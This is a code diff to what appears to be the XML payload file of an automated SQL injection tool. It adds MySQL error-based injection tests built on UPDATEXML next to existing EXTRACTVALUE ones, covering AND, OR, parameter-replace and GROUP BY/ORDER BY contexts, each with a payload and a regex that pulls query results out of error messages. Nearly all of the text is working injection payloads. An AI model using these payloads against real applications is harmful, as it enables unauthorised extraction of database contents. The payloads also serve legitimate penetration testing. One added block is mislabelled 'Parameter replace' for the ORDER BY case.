@@ -1010,15 +1010,35 @@ Formats:
     </test>
 
     <test>
-        <title>MySQL &gt;= 5.1 AND error-based - WHERE or HAVING clause</title>
+        <title>MySQL &gt;= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)</title>
         <stype>2</stype>
         <level>2</level>
         <risk>0</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>AND EXTRACTVALUE([RANDNUM], CONCAT('\', '[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
+        <vector>AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
         <request>
-            <payload>AND EXTRACTVALUE([RANDNUM], CONCAT('\', '[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
+            <payload>AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.1 AND error-based - WHERE or HAVING clause (UPDATEXML)</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])</vector>
+        <request>
+            <payload>AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'),[RANDNUM1])</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1208,15 +1228,35 @@ Formats:
     </test>
 
     <test>
-        <title>MySQL &gt;= 5.1 OR error-based - WHERE or HAVING clause</title>
+        <title>MySQL &gt;= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)</title>
         <stype>2</stype>
         <level>3</level>
         <risk>2</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>OR EXTRACTVALUE([RANDNUM], CONCAT('\', '[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
+        <vector>OR EXTRACTVALUE([RANDNUM],CONCAT('\', '[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
         <request>
-            <payload>OR EXTRACTVALUE([RANDNUM], CONCAT('\', '[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
+            <payload>OR EXTRACTVALUE([RANDNUM],CONCAT('\', '[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.1 OR error-based - WHERE or HAVING clause (UPDATEXML)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])</vector>
+        <request>
+            <payload>OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'),[RANDNUM1])</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1433,7 +1473,7 @@ Formats:
     </test>
 
     <test>
-        <title>MySQL &gt;= 5.1 - Parameter replace</title>
+        <title>MySQL &gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)</title>
         <stype>2</stype>
         <level>3</level>
         <risk>0</risk>
@@ -1442,6 +1482,26 @@ Formats:
         <vector>(EXTRACTVALUE([RANDNUM], CONCAT('\', '[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')))</vector>
         <request>
             <payload>(EXTRACTVALUE([RANDNUM], CONCAT('\', '[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]')))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>0</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1]))</vector>
+        <request>
+            <payload>(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'),[RANDNUM1]))</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1554,7 +1614,7 @@ Formats:
     </test>
 
     <test>
-        <title>MySQL &gt;= 5.1 error-based - GROUP BY and ORDER BY clauses</title>
+        <title>MySQL &gt;= 5.1 error-based - GROUP BY and ORDER BY clauses (EXTRACTVALUE)</title>
         <stype>2</stype>
         <level>3</level>
         <risk>0</risk>
@@ -1563,6 +1623,26 @@ Formats:
         <vector>,EXTRACTVALUE([RANDNUM], CONCAT('\', '[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
         <request>
             <payload>,EXTRACTVALUE([RANDNUM], CONCAT('\', '[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>0</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])</vector>
+        <request>
+            <payload>,UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'),[RANDNUM1])</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
